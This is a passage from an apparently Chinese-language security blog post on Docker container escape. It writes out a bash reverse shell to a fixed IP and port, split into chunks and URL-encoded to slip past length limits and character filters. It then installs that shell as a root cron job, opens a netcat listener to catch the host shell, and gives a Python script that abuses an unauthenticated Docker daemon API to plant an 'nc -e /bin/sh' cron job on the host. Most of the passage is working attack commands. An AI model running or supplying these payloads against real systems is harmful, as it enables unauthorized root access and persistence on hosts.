class="built_in">test</span>/tmp/crontabshell</span><br></pre></td></tr></table></figure><p><strong>==可能遇到的问题==</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">当命令执行有长度限制时，解决办法如下：</span></span><br><span class="line">echo &quot;#!/bin/bash&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;bash -i &quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;bash -i &quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;&gt;&amp; /dev/&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;tcp/192.&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;168.137.&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;235/7777&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot; 0&gt;&amp;1 &amp;&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line"><span class="meta">#</span><span class="bash">如果遇到&amp; &gt;等特殊符号写不进去可以尝试编码之后再写，如下：</span></span><br><span class="line">touch ./test/tmp/crontabshell</span><br><span class="line">echo &quot;#!/bin/bash&quot; &gt; ./test/tmp/crontabshell</span><br><span class="line">echo &quot;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.137.235%2F7777%200%3E%261%20%26&quot; &gt;&gt; ./test/tmp/crontabshell</span><br></pre></td></tr></table></figure><p>在系统计划任务里写入执行脚本的定时任务：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*/1 * * * * root /tmp/crontabshell&quot;</span> &gt;&gt; ./<span class="built_in">test</span>/etc/crontab</span><br><span class="line"><span class="comment">#编码结果如下：</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*%2F1%20*%20*%20*%20*%20root%20%2Ftmp%2Fcrontabshell&quot;</span> &gt;&gt; ./<span class="built_in">test</span>/etc/crontab</span><br></pre></td></tr></table></figure><p>在攻击机上开启netcat监听7777端口，成功接收到宿主主机的Shell，实现Docker逃逸。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210106185232646.png" alt="image-20210106185232646"></p><h1 id="docker-daemon-api-未授权访问"><a href="#docker-daemon-api-未授权访问" class="headerlink" title="docker daemon api 未授权访问"></a>docker daemon api 未授权访问</h1><p>访问your-ip:2375/version验证是否搭建成功</p><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210107154914903.png" alt="image-20210107154914903"></p><p>利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">&#x27;http://192.168.11.160:2375/&#x27;</span>)</span><br><span class="line">data = client.containers.run(<span class="string">&#x27;alpine:latest&#x27;</span>, <span class="string">r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;*/1 * * * * /usr/bin/nc 192.168.11.1 21 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;</span>, remove=<span class="literal">True</span>, volumes=&#123;<span class="string">&#x27;/etc&#x27;</span>: &#123;<span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/etc&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vuln </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
